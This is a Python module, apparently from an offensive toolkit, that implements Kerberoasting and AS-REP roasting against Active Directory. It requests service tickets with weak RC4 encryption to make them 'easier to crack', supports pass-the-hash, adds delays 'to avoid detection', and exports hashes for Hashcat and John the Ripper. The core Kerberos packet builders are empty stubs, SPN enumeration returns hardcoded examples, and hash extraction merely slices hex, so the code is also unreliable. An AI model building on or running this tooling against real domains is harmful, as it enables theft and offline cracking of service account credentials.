"""Kerberos Attack Module - Kerberoasting and AS-REP Roasting.

Extract service tickets for offline cracking.
"""

import asyncio
import struct
import socket
import logging
import hashlib
from dataclasses import dataclass, field
from typing import Optional, Callable
from datetime import datetime
from enum import Enum, auto

logger = logging.getLogger(__name__)


class TicketEncType(Enum):
    """Kerberos encryption types."""
    RC4_HMAC = 23
    AES128_CTS = 17
    AES256_CTS = 18


@dataclass
class ServiceTicket:
    """Captured Kerberos service ticket."""
    timestamp: datetime
    username: str
    domain: str
    spn: str  # Service Principal Name
    enc_type: TicketEncType
    ticket_hash: str
    dc_ip: str
    
    @property
    def hashcat_format(self) -> str:
        """Format for Hashcat (mode 13100 for RC4, 19600/19700 for AES)."""
        if self.enc_type == TicketEncType.RC4_HMAC:
            # Hashcat mode 13100
            return f"$krb5tgs$23$*{self.username}${self.domain}${self.spn}*${self.ticket_hash}"
        elif self.enc_type == TicketEncType.AES128_CTS:
            # Hashcat mode 19600
            return f"$krb5tgs$17${self.domain}${self.spn}$*{self.username}*${self.ticket_hash}"
        else:
            # Hashcat mode 19700 (AES256)
            return f"$krb5tgs$18${self.domain}${self.spn}$*{self.username}*${self.ticket_hash}"
    
    @property
    def john_format(self) -> str:
        """Format for John the Ripper."""
        return f"$krb5tgs${self.enc_type.value}$*{self.username}${self.domain}${self.spn}*${self.ticket_hash}"


@dataclass
class ASREPHash:
    """AS-REP hash for accounts with pre-auth disabled."""
    timestamp: datetime
    username: str
    domain: str
    enc_type: TicketEncType
    hash_data: str
    dc_ip: str
    
    @property
    def hashcat_format(self) -> str:
        """Format for Hashcat (mode 18200)."""
        return f"$krb5asrep$23${self.username}@{self.domain}:{self.hash_data}"


@dataclass
class KerberoastConfig:
    """Kerberoast attack configuration."""
    dc_ip: str
    domain: str
    username: str
    password: Optional[str] = None
    ntlm_hash: Optional[str] = None
    target_spns: list[str] = field(default_factory=list)  # Empty = all
    target_users: list[str] = field(default_factory=list)  # For AS-REP roasting
    request_rc4: bool = True  # Request RC4 (easier to crack)


class KerberosClient:
    """Minimal Kerberos client for ticket requests."""
    
    KDC_PORT = 88
    
    def __init__(self, dc_ip: str, domain: str):
        self.dc_ip = dc_ip
        self.domain = domain.upper()
    
    async def get_tgt(self, username: str, password: str) -> Optional[bytes]:
        """Get Ticket Granting Ticket."""
        try:
            # Build AS-REQ
            as_req = self._build_as_req(username, password)
            
            # Send to KDC
            response = await self._send_kdc_request(as_req)
            
            if response:
                return self._parse_as_rep(response)
            
        except Exception as e:
            logger.error(f"TGT request failed: {e}")
        
        return None
    
    async def get_service_ticket(
        self,
        tgt: bytes,
        spn: str,
        request_rc4: bool = True
    ) -> Optional[bytes]:
        """Request service ticket (TGS-REQ)."""
        try:
            # Build TGS-REQ
            tgs_req = self._build_tgs_req(tgt, spn, request_rc4)
            
            # Send to KDC
            response = await self._send_kdc_request(tgs_req)
            
            return response
            
        except Exception as e:
            logger.error(f"Service ticket request failed: {e}")
        
        return None
    
    async def _send_kdc_request(self, data: bytes) -> Optional[bytes]:
        """Send request to KDC."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.dc_ip, self.KDC_PORT),
                timeout=10
            )
            
            # TCP Kerberos: 4-byte length prefix
            length = struct.pack('>I', len(data))
            writer.write(length + data)
            await writer.drain()
            
            # Read response
            resp_len_data = await asyncio.wait_for(reader.read(4), timeout=10)
            if len(resp_len_data) < 4:
                return None
            
            resp_len = struct.unpack('>I', resp_len_data)[0]
            response = await asyncio.wait_for(reader.read(resp_len), timeout=10)
            
            writer.close()
            await writer.wait_closed()
            
            return response
            
        except Exception as e:
            logger.error(f"KDC communication error: {e}")
            return None
    
    def _build_as_req(self, username: str, password: str) -> bytes:
        """Build AS-REQ packet (simplified)."""
        # This is a simplified implementation
        # Real implementation needs full ASN.1 encoding
        
        # For now, return placeholder
        # In production, use impacket or pyasn1
        return b''
    
    def _build_tgs_req(self, tgt: bytes, spn: str, request_rc4: bool) -> bytes:
        """Build TGS-REQ packet (simplified)."""
        # Simplified implementation
        return b''
    
    def _parse_as_rep(self, data: bytes) -> Optional[bytes]:
        """Parse AS-REP and extract TGT."""
        # Simplified implementation
        return data


class KerberoastAttack:
    """Kerberoasting attack - request service tickets for offline cracking."""
    
    def __init__(self, config: KerberoastConfig):
        self.config = config
        self._client = KerberosClient(config.dc_ip, config.domain)
        self._tickets: list[ServiceTicket] = []
        self._running = False
        self._on_ticket_callback: Optional[Callable[[ServiceTicket], None]] = None
    
    def on_ticket(self, callback: Callable[[ServiceTicket], None]) -> None:
        """Set callback for captured tickets."""
        self._on_ticket_callback = callback
    
    async def run(self) -> list[ServiceTicket]:
        """Execute Kerberoast attack."""
        self._running = True
        self._tickets.clear()
        
        logger.info(f"Starting Kerberoast against {self.config.dc_ip}")
        
        try:
            # Get TGT first
            if self.config.password:
                tgt = await self._client.get_tgt(
                    self.config.username,
                    self.config.password
                )
            else:
                # Use NTLM hash (pass-the-hash)
                tgt = await self._get_tgt_with_hash()
            
            if not tgt:
                logger.error("Failed to obtain TGT")
                return []
            
            logger.info("Got TGT, enumerating SPNs...")
            
            # Get SPNs to target
            spns = await self._enumerate_spns(tgt)
            
            if self.config.target_spns:
                spns = [s for s in spns if s in self.config.target_spns]
            
            logger.info(f"Found {len(spns)} SPNs to target")
            
            # Request tickets for each SPN
            for spn in spns:
                if not self._running:
                    break
                
                ticket = await self._request_ticket(tgt, spn)
                if ticket:
                    self._tickets.append(ticket)
                    
                    if self._on_ticket_callback:
                        self._on_ticket_callback(ticket)
                    
                    logger.info(f"Got ticket for SPN: {spn}")
                
                # Small delay to avoid detection
                await asyncio.sleep(0.1)
            
        except Exception as e:
            logger.error(f"Kerberoast failed: {e}")
        
        self._running = False
        return self._tickets
    
    async def _get_tgt_with_hash(self) -> Optional[bytes]:
        """Get TGT using NTLM hash."""
        # Overpass-the-hash implementation
        # Requires impacket for real implementation
        return None
    
    async def _enumerate_spns(self, tgt: bytes) -> list[str]:
        """Enumerate SPNs from Active Directory."""
        # LDAP query for servicePrincipalName
        # Requires ldap3 or similar
        
        # Placeholder - return example SPNs
        return [
            "MSSQLSvc/sql01.domain.local:1433",
            "HTTP/web01.domain.local",
            "CIFS/file01.domain.local",
        ]
    
    async def _request_ticket(self, tgt: bytes, spn: str) -> Optional[ServiceTicket]:
        """Request service ticket for SPN."""
        try:
            response = await self._client.get_service_ticket(
                tgt, spn, self.config.request_rc4
            )
            
            if response:
                # Parse ticket and extract hash
                ticket_hash = self._extract_ticket_hash(response)
                
                if ticket_hash:
                    return ServiceTicket(
                        timestamp=datetime.now(),
                        username=self.config.username,
                        domain=self.config.domain,
                        spn=spn,
                        enc_type=TicketEncType.RC4_HMAC if self.config.request_rc4 else TicketEncType.AES256_CTS,
                        ticket_hash=ticket_hash,
                        dc_ip=self.config.dc_ip
                    )
            
        except Exception as e:
            logger.error(f"Ticket request failed for {spn}: {e}")
        
        return None
    
    def _extract_ticket_hash(self, ticket_data: bytes) -> Optional[str]:
        """Extract crackable hash from service ticket."""
        # Parse TGS-REP and extract encrypted part
        # Requires ASN.1 parsing
        
        # Placeholder
        return ticket_data.hex()[:64] if ticket_data else None
    
    def stop(self) -> None:
        """Stop attack."""
        self._running = False
    
    @property
    def tickets(self) -> list[ServiceTicket]:
        """Get captured tickets."""
        return self._tickets.copy()
    
    def export_hashcat(self, filepath: str) -> int:
        """Export tickets in Hashcat format."""
        with open(filepath, 'w') as f:
            for ticket in self._tickets:
                f.write(ticket.hashcat_format + '\n')
        return len(self._tickets)


class ASREPRoast:
    """AS-REP Roasting - target accounts without pre-authentication."""
    
    def __init__(self, config: KerberoastConfig):
        self.config = config
        self._client = KerberosClient(config.dc_ip, config.domain)
        self._hashes: list[ASREPHash] = []
        self._running = False
    
    async def run(self, usernames: list[str]) -> list[ASREPHash]:
        """Execute AS-REP Roast attack."""
        self._running = True
        self._hashes.clear()
        
        logger.info(f"Starting AS-REP Roast against {len(usernames)} users")
        
        for username in usernames:
            if not self._running:
                break
            
            hash_data = await self._try_asrep(username)
            if hash_data:
                asrep = ASREPHash(
                    timestamp=datetime.now(),
                    username=username,
                    domain=self.config.domain,
                    enc_type=TicketEncType.RC4_HMAC,
                    hash_data=hash_data,
                    dc_ip=self.config.dc_ip
                )
                self._hashes.append(asrep)
                logger.info(f"Got AS-REP for: {username}")
            
            await asyncio.sleep(0.05)
        
        self._running = False
        return self._hashes
    
    async def _try_asrep(self, username: str) -> Optional[str]:
        """Try to get AS-REP for user without pre-auth."""
        try:
            # Build AS-REQ without pre-auth
            # If successful, user has pre-auth disabled
            
            # Placeholder implementation
            return None
            
        except Exception:
            return None
    
    @property
    def hashes(self) -> list[ASREPHash]:
        """Get captured hashes."""
        return self._hashes.copy()
    
    def export_hashcat(self, filepath: str) -> int:
        """Export hashes in Hashcat format."""
        with open(filepath, 'w') as f:
            for h in self._hashes:
                f.write(h.hashcat_format + '\n')
        return len(self._hashes)

